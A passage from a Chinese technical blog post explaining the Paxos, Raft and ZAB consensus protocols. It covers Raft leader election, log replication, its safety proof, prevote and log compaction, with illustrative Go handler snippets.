Paxos</a></p>\n<p>同样这个协议中也穿插着半数同意的条件。</p>\n<p>那么为什么要用两个过程而不是一个，是因为：一个提案是一个(编号，值）对，各个节点并没有规定只能给一个提案回复promise，只要编号更大就会回复promise，所以在完成一轮交互前，那些节点可能又转而给别的提案回复了promise，于是这就需要第二轮交互来确保大部分节点并没有给别的提案回复promise。<br>那第二轮之后会不会那些节点又给别的提案发了promise呢，还是会的(只要prepare的编号更大)，那怎么办呢，办法是加约束：一旦某个节点B给提案X回复了accept，那么他就会记录下他已经投给了X，下次收到一个提案Y的时候，B在回复promise的同时会带上自己已经accept过的提案X的信息，B在看到已经有了accept过的提案了，那么B就会把自己的提案的值改成已经accpet的提案（中的最大值），并继续后面的过程。这样就不会使用B原先自己的提案值了，并且加速了投票结果的收敛。也就是说提出提案的这个节点是不会一直坚持自己的提案的值的，而是会轻易的转变自己的想法。</p>\n<p>这个约束满足P2c约束：</p>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;https://zh.wikipedia.org/zh-cn/Paxos%E7%AE%97%E6%B3%95</span><br><span class=\"line\">&gt;P2c：如果一个编号为 n 的提案具有 value v，该提案被提出（issued），那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于 n 的任何提案，要么他们已经接受（accept）的所有编号小于 n 的提案中编号最大的那个提案具有 value v。</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><img src=\"/linkimage/raft/paxos_flow.png\" alt=\"paxos_flow\"></p>\n<p>图片来自 <a href=\"https://www.jianshu.com/p/0ba4d0e03a71\">Paxos协议初探</a></p>\n<h3 id=\"raft\"><a href=\"#raft\" class=\"headerlink\" title=\"raft\"></a>raft</h3><p>raft协议跟paxos不同，paxos一次只能提交一个结果，raft则不同。<br>raft首先通过一个选举过程选出谁是这个集群的leader，之后所有的更新操作都有leader来发起，leader在发起的同时把操作通过日志的方式源源不断的发给其他节点，leader跟每个节点保持一个连接，因此leader发给每个节点的日志都可以做到有序，同时每个节点收到的日志的进度是不同的。当超过一半的节点都确认收到了某个日志后，这个日志以及之前的所有日志都被认为是已经提交的，已经提交的日志是不可变的，是可以安全的使用的，后面不会再删除或者变更。因此commit后就可以认为这条日志写入成功。</p>\n<p><img src=\"/linkimage/raft/raft_req_res.png\" alt=\"raft_req_res\"></p>\n<p>图片来自 <a href=\"https://yfscfs.gitee.io/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%E4%B9%8B%E5%88%86%E5%B8%83%E5%BC%8F%E5%8D%8F%E8%AE%AE%E4%B8%8E%E7%AE%97%E6%B3%95%E5%AE%9E%E6%88%98-08-raft%E7%AE%97%E6%B3%95-%E4%BA%8C-%E5%A6%82%E4%BD%95%E5%A4%8D%E5%88%B6%E6%97%A5%E5%BF%97/\">Raft算法 二 如何复制日志</a></p>\n<p>强leader的机制下leader的选举就是一个重要的过程。选举是基于日志的新旧来决定的，拥有更新的日志的节点就能拥有更多的选票，但并不一定是拥有最新的日志的那个成为leader，因为投票的规则就是如果你的日志比我新我就投给你，但是一轮投票中只允许投给一个，先到先得。这样一轮投票中票数总数是有上限的，最多就是每个节点一票。拥有超过一半的票数就可以确保拥有了最多的票数，也就可以成为这一轮的leader。如果都没有达到过半，就超时进入下一轮。</p>\n<h3 id=\"zab\"><a href=\"#zab\" class=\"headerlink\" title=\"zab\"></a>zab</h3><p>zab是zooker中用来做一致性保证的协议，他的思路也是先选出leader，然后由leader来做出所有的更新操作，并同步给follower，过程跟raft差不多。<br>zab的选举过程跟raft有些差异，在一个选举周期内，每个节点可以重复给别的节点投票，只要他收到了来自更优条件的投票请求，更优的条件是指有更大的zxid（由epoch+sequence组成），zxid相等则有更大的服务器id。<br>同时每个节点会把自己的投票信息广播出去，同时会保存下来其他节点广播过来的投票信息，如果一个节点发现有超过一半的节点赞成了自己的投票，也就是跟自己投的是一样的，那么他就会结束投票，并把自己的状态相应的更新成follower或者是leader。</p>\n<p>如下图是第一轮投票的通信情况，3个节点都投给自己，通信中的(x,y,z)表示（本机节点id，投给的节点id，投给的节点的wxid）；方框内（a,b)代表这个节点的投票箱中记录的投票信息a投给了b。</p>\n<p><img src=\"/linkimage/raft/zab_election.png\" alt=\"zab_election\"></p>\n<p>图片来自 <a href=\"https://www.sohu.com/a/214834823_411876\">实例详解ZooKeeper ZAB协议、分布式锁与领导选举 </a></p>\n<p>所以如果拥有最优条件的leader跟别的节点连通良好的话最后选出来的肯定是他。<br>那如果连通不好呢，比如网络不畅。比如在刚选出leader的时候，一个更优的节点突然加入。则会导致大家又开始投票，如果大部分节点此时都已经结束这一轮投票了，那么这个新加入的就成不了leader，因为他问一遍后发现大家都已经投给了别人，那他就会认同那个leader，如果大部分节点还没结束投票即还没统计出半数统一的结果，那么最终这个新节点会当上新的leader。等价的场景包括，拥有更优条件的节点网络连接不畅，很晚才跟大家连上；leader挂掉后重启；</p>\n<p>下面在重点展开讲一下raft协议细节。</p>\n<h2 id=\"raft协议\"><a href=\"#raft协议\" class=\"headerlink\" title=\"raft协议\"></a>raft协议</h2><p>前面大概讲了下，raft是一个强leader的协议，leader负责写入日志，并把日志源源不断传给follower。</p>\n<p>下面我们分别从选主、日志复制、安全性、成员变更，日志压缩这几个点来展开了解一下raft的细节。</p>\n<p>注：如无特别标注，以下图片均来自 <a href=\"https://raft.github.io/raft.pdf\">In Search of an Understandable Consensus Algorithm</a></p>\n<h3 id=\"选主\"><a href=\"#选主\" class=\"headerlink\" title=\"选主\"></a>选主</h3><p>raft集群中每个节点在初始时是平等的，谁都可能成为主，但是最开始时谁都不是主，那是什么呢？是follower。</p>\n<p>每个follow会独立的配置一个（一定范围内的）随机的超时值。然后如果在这个超时值内没有收到leader发来的心跳，那么这个follower会变身成为candidate，这是节点的第二种身份，candidate会给别的节点广播选举自己为leader的请求，如果收到[同意]的节点数（包括自己）超过一半，那么candidate就会顺利成为leader，这是节点的第三种身份，成为leader后就会定时发送心跳给其他的节点，这个心跳包有两个作用，一个是传递日志信息，一个是可以抑制其他节点成为leader和candidate。</p>\n<p>怎么抑制的呢? 当你处于follower的时候，如果收到了leader的心跳，follower就会继续安心的做一个follower；candidate如果收到leader的心跳，也会继续变回follower。</p>\n<p><img src=\"/linkimage/raft/raft_states.png\" alt=\"raft_states\"></p>\n<p>现在看着这个图大概就能明白状态是怎么变化的了。</p>\n<p>当一个节点成为leader后，他会拥有几个比历史leader都要更高的term，在之后他当leader的周期内所有的log和心跳都会打上这个term标记，leader的follower们也会记录这个term。那这个term是什么时候调大的呢，就在一个candidate发起选举的时候。每个candidate独立变更term，无需全局唯一。</p>\n<p><img src=\"/linkimage/raft/raft_term.png\" alt=\"raft_term\"></p>\n<p>那么可以想象，如果你收到了一个心跳，里面携带了更高的term，那么就代表对方有比自己更新的周期，这个时候自己就会立刻转成follower（如上面状态图文字所描述），即使你是leader，遇到更高term的请求还是要降为follower。</p>\n<p>如果一轮选举选不出leader，比如上图的t3，那么就会再选一轮，对应上面状态图中有一个candidate到candidate自己的箭头，这种情况是发生在一个candidate选举中如果没有在一个选举超时周期内达到半数同意，并且又没有leader的心跳收到，那么就会进入新一轮的选举。</p>\n<p>那么一个节点到底什么情况下会投票给另一个节点呢？</p>\n<p>raft规定一个节点只会投票给拥有比自己更新的日志的节点。更新的日志的定义是：term更大，或者term相等并且index更大。一个candidate在vote请求中会携带自身拥有的最新的那个日志的index和term，收到vote的请求的节点如果觉得请求中的log信息更新，就会投给他，否则不投给他。</p>\n<p>那么一个节点的RequestVoteHandler的实现大概如下：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(self *Raft)</span> <span class=\"title\">RequestVoteHandler</span><span class=\"params\">(args *RequestVoteArgs, reply *RequestVoteReply)</span></span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 当前term不够大</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (args.Term &lt; self.currentTerm) &#123;</span><br><span class=\"line\">        reply.Term = self.currentTerm</span><br><span class=\"line\">        reply.VoteGranted = <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 已经投给了其他节点了</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.Term == self.currentTerm &amp;&amp;</span><br><span class=\"line\">        self.votedFor != <span class=\"number\">-1</span> &amp;&amp; </span><br><span class=\"line\">        self.votedFor != args.CandidateId &#123;</span><br><span class=\"line\">        reply.Term = self.currentTerm</span><br><span class=\"line\">        reply.VoteGranted = <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span>      </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 更大的term立即成为follower</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.Term &gt; self.currentTerm &#123;</span><br><span class=\"line\">        self.convertToFollower(args.Term)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    lastLogIndex := self.lastLogIndex</span><br><span class=\"line\">    lastLogTerm := self.lastLogTerm</span><br><span class=\"line\">    <span class=\"comment\">//日志的term不够大</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (args.LastLogTerm &lt; lastLogTerm) &#123;</span><br><span class=\"line\">        reply.Term = self.currentTerm</span><br><span class=\"line\">        reply.VoteGranted = <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span>  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 日志的index不够大</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (args.LastLogTerm ==lastLogTerm) &amp;&amp;</span><br><span class=\"line\">       (args.LastLogIndex &lt; lastLogIndex) &#123;</span><br><span class=\"line\">        reply.Term = rf.currentTerm</span><br><span class=\"line\">        reply.VoteGranted = <span class=\"literal\">false</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 停止超时定时器</span></span><br><span class=\"line\">    self.resetCandidateTimer()</span><br><span class=\"line\">    self.resetReCandidateTimer()</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// 投给他</span></span><br><span class=\"line\">    self.votedFor = args.CandidateId</span><br><span class=\"line\">    reply.Term = self.currentTerm</span><br><span class=\"line\">    reply.VoteGranted = <span class=\"literal\">true</span></span><br><span class=\"line\">    self.persist()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>同时raft为了加快投票的收敛速度，通过随机化选举超时的时间来错开选举的时间(如果有办法能让日志越新的越早触发就更好了）。在leader出问题后，拥有最小随机值的节点会最先触发选举，随后其他节点就会投票给这个节点，raft规定一个节点在一轮投票中只能投给一个节点，因此只要拿到了一半选票，就可以认为选举成功了。</p>\n<h3 id=\"日志复制\"><a href=\"#日志复制\" class=\"headerlink\" title=\"日志复制\"></a>日志复制</h3><p>在选举出leader之后，后面的过程就是leader源源不断把日志复制给follower的过程了。</p>\n<p>我们先来看一下一个节点的内部组成：</p>\n<p><img src=\"/linkimage/raft/state_machine.png\" alt=\"state_machine\"></p>\n<p>每个节点都有3部分组成，一个是负责处理一致性协议的，一个是负责存储log的，一个是状态机。</p>\n<p>一个写入过程对应的就是图中的1，2，3.</p>\n<ol>\n<li><p>client把写入请求发给leader server，server中的一致性模块收到请求。</p>\n</li>\n<li><p>一致性模块把请求打包成一个log entry，写入本地log store，并把log entry发给follower。</p>\n<p>follower的一致性模块收到log entry后写入他的本地log store，随后返回成功给leader。</p>\n</li>\n<li><p>leader统计到超过一半的节点写入成功后，把这条日志变成commited状态，并交给状态机进行apply log。</p>\n</li>\n<li><p>第四步并非上图中的4，而是leader在随后的心跳中把commit信息下发下去，follow的一致性模块收到心跳后，发现前面写入log store的日志已经处于commit状态了，就吧log交给状态机进行apply。</p>\n</li>\n</ol>\n<p>可以看到follow apply log的时间会稍微晚于leader。</p>\n<p>而读取的过程就是上图中的4了，读取的过程不需要经过一致性模块，读取数据直接从状态机查询结果即可，状态机存储的就是log 按序apply后的一个最终结果。</p>\n<p>leader给follower下发log的时候，leader给每个follower分别维护了一个连接+当前follower的进度，所以不同的follow接收日志有快有慢，但是每一个follow接收到的log都是有序的。</p>\n<p><img src=\"/linkimage/raft/raft_logs.png\" alt=\"raft_logs\"></p>\n<p>那么如果网络不畅，leader发过去的几个请求乱序了，follower这边怎么能做到不乱序呢？</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> AppendEntriesArgs <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">\tLeaderId <span class=\"keyword\">int</span></span><br><span class=\"line\">\tPrevLogIndex <span class=\"keyword\">int</span></span><br><span class=\"line\">\tPrevLogTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">\tEntries []Entry</span><br><span class=\"line\">\tLeaderCommit <span class=\"keyword\">int</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>就是通过这个结构中的PrevLogIndex和PreLogTerm，follow收到leader下发的log请求后，先判断这个请求的term够不够大, 不够就打回，够了再进行下一步：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> args.Term &lt; self.currentTerm &#123;</span><br><span class=\"line\">   reply.Term = self.currentTerm</span><br><span class=\"line\">   reply.Success = <span class=\"literal\">false</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">// 停止超时定时器</span></span><br><span class=\"line\">   self.resetCandidateTimer()</span><br><span class=\"line\">   self.resetReCandidateTimer()</span><br><span class=\"line\">   self.convertToFollower(args.Term, args.LeaderId)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>接着follower把本地log store的指针指到PrevLogIndex的位置，然后检查下这个本地log的term跟请求中的term是不是一致，一致的话就遍历Entries并与本地log比较，一旦发现不一致了，就从不一致的地方开始覆盖掉本地的日志。</p>\n<p><img src=\"/linkimage/raft/log_apped.png\" alt=\"log_apped\"></p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">unmatch_index := <span class=\"number\">-1</span></span><br><span class=\"line\"> <span class=\"comment\">// 找出req和local不一致的日志的index</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> req_log_index := <span class=\"keyword\">range</span> args.Entries &#123;</span><br><span class=\"line\">   localCheckIndex := args.PrevLogIndex + <span class=\"number\">1</span> + req_log_index</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (localCheckIndex &gt;= <span class=\"built_in\">len</span>(self.log)) || </span><br><span class=\"line\">     (self.log[localCheckIndex].Term != args.Entries[req_log_index].Term) &#123;</span><br><span class=\"line\">     unmatch_index = req_log_index</span><br><span class=\"line\">     <span class=\"keyword\">break</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> unmatch_index != <span class=\"number\">-1</span> &#123;</span><br><span class=\"line\">   <span class=\"comment\">// 用req的log覆盖本地log</span></span><br><span class=\"line\">   self.log = <span class=\"built_in\">append</span>(self.log[:args.PrevLogIndex+<span class=\"number\">1</span>+unmatch_index],</span><br><span class=\"line\">     args.Entries[unmatch_index:]...)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>那么如果term不一致呢？</p>\n<p>这时候follower返回一个错误，告知leader这个位置不对：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> AppendEntriesReply <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">\tSuccess <span class=\"keyword\">bool</span></span><br><span class=\"line\">\tConflictIndex <span class=\"keyword\">int</span></span><br><span class=\"line\">\tConflictTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>leader可以根据自己的实现把PrevLogIndex往前推若干的位置，然后再次下发给follower。</p>\n<h3 id=\"安全性\"><a href=\"#安全性\" class=\"headerlink\" title=\"安全性\"></a>安全性</h3><p>问题一，日志安全性。</p>\n<p>在讲完选举和日志复制后，最疑惑大家的应该就是日志的安全性，你要怎么确保commit了的log不会被新的leader覆盖掉呢？</p>\n<p>有兴趣的可以看完整的证明：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">中英对照：</span><br><span class=\"line\">Suppose the leader <span class=\"keyword\">for</span> term T (leaderT) commits a logentry from its term, but that <span class=\"built_in\">log</span> entry is not stored by theleader of some future term. Consider the smallest term U&gt;T whose leader (leaderU) does not store the entry.</span><br><span class=\"line\">假设term T的一个leader commit了一个<span class=\"built_in\">log</span>，然后存在一个term U的leader，这个leader不存在这个<span class=\"built_in\">log</span>。我们取U为大于T且不存在这个<span class=\"built_in\">log</span>的所有term中最小的那个。</span><br><span class=\"line\">下面我们要在这个假设下推导出矛盾来证明不可能存在这种情况。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1. The committed entry must have been absent from leaderU’s <span class=\"built_in\">log</span> at the time of its election (leaders neverdelete or overwrite entries).</span><br><span class=\"line\">这个committed的<span class=\"built_in\">log</span>在leaderU选举时一定已经不存在U上了，因为leader不会自己删<span class=\"built_in\">log</span>，所以不存在leaderU选上leader后自己删掉<span class=\"built_in\">log</span>的可能性</span><br><span class=\"line\"></span><br><span class=\"line\">2. leaderT replicated the entry on a majority of the clus-ter, and leaderU received votes from a majority ofthe cluster. Thus, at least one server (“the voter”)both accepted the entry from leaderTand voted forleaderU. The voter is key toreaching a contradiction.</span><br><span class=\"line\">leaderT把<span class=\"built_in\">log</span>下发给了大多数，leaderU又得到了大多数的投票，所以至少存在一个节点是同时得到了<span class=\"built_in\">log</span>也投个了leaderU的，这个节点我们叫他voter，是推导出矛盾的关键。</span><br><span class=\"line\"></span><br><span class=\"line\">3. The voter must have accepted the committed entry from leaderT before voting <span class=\"keyword\">for</span> leaderU; otherwise it would have rejected the AppendEntries request from leaderT(its current term would have been higher thanT).</span><br><span class=\"line\">这个voter在给leaderU投票前一定已经拿到<span class=\"built_in\">log</span>了，不然如果先投票了的话，voter就会保存下来这个这个term U并拒绝leaderT发过来的<span class=\"built_in\">log</span>，因为这个<span class=\"built_in\">log</span>的term太低了。</span><br><span class=\"line\"></span><br><span class=\"line\">4. The voter still stored the entry when it voted <span class=\"keyword\">for</span> leaderU, since every intervening leader contained the entry (by assumption), leaders never remove entries,and followers only remove entries <span class=\"keyword\">if</span> they conflictwith the leader.</span><br><span class=\"line\">voter在给U投票时一定还是持有着<span class=\"built_in\">log</span>的，因为我们前面假设了U是第一个比T大且不持有<span class=\"built_in\">log</span>的leader，因此T-&gt;U中间的leader都是持有<span class=\"built_in\">log</span>的，而leader是不会丢弃<span class=\"built_in\">log</span>的，follower也不会覆盖跟leader一致的<span class=\"built_in\">log</span>，只会丢弃跟leader冲突的<span class=\"built_in\">log</span>（及其后面的<span class=\"built_in\">log</span>）。所以在给U投票时，一定是持有<span class=\"built_in\">log</span>的。</span><br><span class=\"line\"></span><br><span class=\"line\">5. The voter granted its vote to leaderU, so leaderU’s <span class=\"built_in\">log</span> must have been as up-to-date as the voter’s. This leads to one of two contradictions.</span><br><span class=\"line\">leaderU得到了voter的投票，那么leaderU的日志一定是新于或者等于voter的日志的。这会带来冲突。</span><br><span class=\"line\"></span><br><span class=\"line\">6. First, <span class=\"keyword\">if</span> the voter and leaderU shared the same last <span class=\"built_in\">log</span> term, <span class=\"keyword\">then</span> leaderU’s <span class=\"built_in\">log</span> must have been at leas tas long as the voter’s, so its <span class=\"built_in\">log</span> contained every entry <span class=\"keyword\">in</span> the voter’s <span class=\"built_in\">log</span>. This is a contradiction, since thevoter contained the committed entry and leaderU was assumed not to.</span><br><span class=\"line\">首先，如果U的最新的日志跟voter的最新日志是同一个term，那么U的日志index一定是大于等于voter的才能得到选票，这于U不存在<span class=\"built_in\">log</span>的假设不符。</span><br><span class=\"line\"></span><br><span class=\"line\">7. Otherwise, leaderU’s last <span class=\"built_in\">log</span> term must have been larger than the voter’s. Moreover, it was larger thanT, since the voter’s last <span class=\"built_in\">log</span> term was at least T (it con-tains the committed entry from term T). The earlier leader that created leaderU’s last <span class=\"built_in\">log</span> entry must have contained the committed entry <span class=\"keyword\">in</span> its <span class=\"built_in\">log</span> (by assumption). Then, by the Log Matching Property, leaderU’s <span class=\"built_in\">log</span> must also contain the committed entry, <span class=\"built_in\">which</span> is a contradiction.</span><br><span class=\"line\">那么，如果U的最新的日志比voter的最新日志新，说明T到U中间存在别的leader，这时候中间的leader一定是拥有这个<span class=\"built_in\">log</span>的，因为我们假设了U是大于T且不存在<span class=\"built_in\">log</span>的最小的U，所以T-&gt;U中一定是包含<span class=\"built_in\">log</span>的。那么U成为leader后不会删除<span class=\"built_in\">log</span>的，所有U也包含<span class=\"built_in\">log</span>，这跟假设U不包含<span class=\"built_in\">log</span>不符。</span><br><span class=\"line\"></span><br><span class=\"line\">8. This completes the contradiction. Thus, the leaders of all terms greater than T must contain all entries from term T that are committed <span class=\"keyword\">in</span> term T.</span><br><span class=\"line\">所以大于termT的周期中一定包含T周期中提交的<span class=\"built_in\">log</span>。</span><br><span class=\"line\"></span><br><span class=\"line\">9. The Log Matching Property guarantees that future leaders will also contain entries that are committed indirectly。</span><br><span class=\"line\">某个<span class=\"built_in\">log</span> commit后，index小于这个<span class=\"built_in\">log</span>的日志也被间接提交，这些间接提交的<span class=\"built_in\">log</span>也一定包含在将来的leader中。</span><br></pre></td></tr></table></figure>\n\n<p>简单的证明可以这么理解，因为一个log被提交，说明大于一半的节点都拿到这这条日志；这时候一个节点发起投票，如果他持有的log小于这条log，那么必然会被持有这条log的节点拒绝，无法成为leader。只有拿到这个log的节点才有可能拿到超过一半的投票数。</p>\n<p>问题二，term过大问题。</p>\n<p>不知道你有没有这个疑问，如果集群中一个节点发生了网路隔离，那个这个节点就会发起选举，因为网络隔离，他会一直选举失败，于是一直尝试选举，term一直增大，一段时间后term会很大。</p>\n<p>然后这时候网络恢复，那么这个节点的选举请求会被别的节点收到，别的节点看到一个那么大term的请求，就会纷纷觉得自己状态太旧了，纷纷成为follower。可以对照着这个状态图再看看。</p>\n<p><img src=\"/linkimage/raft/raft_states.png\" alt=\"raft_states\"></p>\n<p>那么一个疑问是，这个那么大term的节点会成为leader吗，他的term很大，log数也可能很大（如果隔离前他是leader的话）。如果成为了leader，它的日志岂不是跟大家的很不一样？答案是不会成为leader。</p>\n<p>如果隔离前是follower，那么现在他的日志数不够多，如果隔离前是leader的话，现在他的日志的term不够大。怎么样都不会成为leader。但是他造成了一波leader选举是肯定了，他让所有节点都接受他这个大term，然后重新选出leader。</p>\n<p>解决方案就是抑制term的增加，通过引入prevote阶段。</p>\n<p>一个candidate在发起vote之前，先要发起一个prevote，其他节点按照vote相同的条件给出判断是否同意，如果半数以上同意，candidate才把term加1，并发起vote，这样发生网络隔离后，节点只能一直发起prevote而无法增加他的term。</p>\n<p>问题三：leader只能commit自己term的日志</p>\n<p>前面讲了日志分发到大部分就可以commit了，但是并不完全这样，有个条件是leader只能在自己term周期的log分发到了大部分的时候才能commit自己周期内的这个log（和他之前的所有log），不能像这样：统计到前面周期的log达到大部分了就把这部分log提交一下。</p>\n<p><img src=\"/linkimage/raft/commint_log_term.png\" alt=\"commint_log_term\"></p>\n<p>我们看上图中的c，其中S1是第四代leader，S5是第三代leader，log2是第二代leader分发下去的，他刚分发3个没来得及commit就挂了。这时候S1发现log2已经分发到了大部分的节点S1S2S3，但是log2不能commit。因此此时如果S1宕机，S5就可能选为leader，因为他的最新日志的term比较大。S5成为leader后就会把日志2都给刷掉，所以log2并不安全，不能提交。</p>\n<p>这里本质上是log2是上上代的leader写入的日志，已经隔代了，可能被中间某一代的leader的日志给覆盖掉。</p>\n<p>所以leader可以安全的commit的条件是这个写入大部分节点的日志是自己这一代的日志（其实前一代的也是可以的，只要不隔代）。</p>\n<h3 id=\"日志压缩\"><a href=\"#日志压缩\" class=\"headerlink\" title=\"日志压缩\"></a>日志压缩</h3><p>大家在看前面的内容的时候，肯定也想到一个问题，log一直存不是越来越多了嘛，那什么时候能删掉呢？</p>\n<p>万一删掉后，有个节点本地log全丢了，不就没办法还原全部日志了吗，那怎么办呢？</p>\n<p>答案就是日志压缩：</p>\n<p><img src=\"/linkimage/raft/log_compaction.png\" alt=\"log_compaction\"></p>\n<p>上图中原本是1-7这7个日志，可以经过压缩，变成snapshot+日志，snapshot是前面已经提交的1-5这5个日志。</p>\n<p>snapshot里面包含两个方面的内容，一个内容就是已经committed的日志经过apply得到的最终结果，还记的前面讲日志复制的时候讲到节点内部的结构，里面有个状态机，这部分数据也就是这个状态机里面的内容。</p>\n<p>另一部分内容是snapshot的元信息，元信息记录了snapshot中最后一条log的index和term。这两个信息是做什么用的呢？ </p>\n<p>还记得讲日志复制的时候，leader分发日志的请求和响应的结构：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// request</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> AppendEntriesArgs <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">\tLeaderId <span class=\"keyword\">int</span></span><br><span class=\"line\">\tPrevLogIndex <span class=\"keyword\">int</span></span><br><span class=\"line\">\tPrevLogTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">\tEntries []Entry</span><br><span class=\"line\">\tLeaderCommit <span class=\"keyword\">int</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// response</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> AppendEntriesReply <span class=\"keyword\">struct</span> &#123;</span><br><span class=\"line\">\tTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">\tSuccess <span class=\"keyword\">bool</span></span><br><span class=\"line\">\tConflictIndex <span class=\"keyword\">int</span></span><br><span class=\"line\">\tConflictTerm <span class=\"keyword\">int</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当follower本地的日志全的时候，就能轻易定位到这个PreLogIndex。当日志变成快照的时候, 就会存在PrevLogIndex已经被包含在快照中的情况，那么这个时候就需要告诉leader我只要快照之后的日志就可以了。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> args.PrevLogIndex &lt; snapshot.last_included_index &#123;</span><br><span class=\"line\">   reply.Term = self.currentTerm</span><br><span class=\"line\">   reply.Success = <span class=\"literal\">false</span></span><br><span class=\"line\">   reply.ConflictTerm = <span class=\"number\">0</span> <span class=\"comment\">//ConflictTerm只起辅助作用，帮助leader快速回退PrevLogIndex，可以填0</span></span><br><span class=\"line\">   reply.ConflictIndex = snapshot.last_included_index + <span class=\"number\">1</span></span><br><span class=\"line\">   <span class=\"keyword\">return</span></span><br><span class=\"line\"> &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> args.PrevLogIndex == snapshot.last_included_index &#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> args.PrevLogTerm != snapshot.last_included_term &#123;</span><br><span class=\"line\">     <span class=\"comment\">// should not happen. request maybe too old</span></span><br><span class=\"line\">     reply.Term = self.currentTerm</span><br><span class=\"line\">     reply.Success = <span class=\"literal\">false</span></span><br><span class=\"line\">     reply.ConflictTerm = snapshot.last_included_term</span><br><span class=\"line\">     reply.ConflictIndex = snapshot.last_included_index</span><br><span class=\"line\">     <span class=\"keyword\">return</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// next step...</span></span><br></pre></td></tr></table></figure>\n\n<p>用到了last_included_index和last_included_term，所以是需要保存下来的。</p>\n<p>snapshot是每个节点独立保存的，可以根据本地的存储情况，独立决定什么时候做日志压缩。</p>\n<p>接下来再来看一个情况，如果这里follower回复了一个ConflictIndex，这时候leader需要把PrevLogIndex往前退，如果PrevLogIndex退到了小于leader本地last_included_index的值，那怎么办，拿不到PrevLogTerm也拿不到某些log了。</p>\n<p>那就比较麻烦一点了，leader需要发送一个InstallSnapshot的请求给这个follower，然后follower保存snapshot并更新原来的log。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(self *Raft)</span> <span class=\"title\">InstallSnapshot</span><span class=\"params\">(args *InstallSnapshotArgs, reply *InstallSnapshotReply)</span></span> &#123;</span><br><span class=\"line\">\t<span class=\"comment\">//...</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> args.LastIncludedIndex &gt; self.lastSnapshotIndex &#123;</span><br><span class=\"line\">\t  self.UpdateSnapshot(args)</span><br><span class=\"line\">\t  self.UpdateLocalLog(args)</span><br><span class=\"line\">\t  self.persister.SaveAllStateAndSnapshot(args)</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"comment\">// 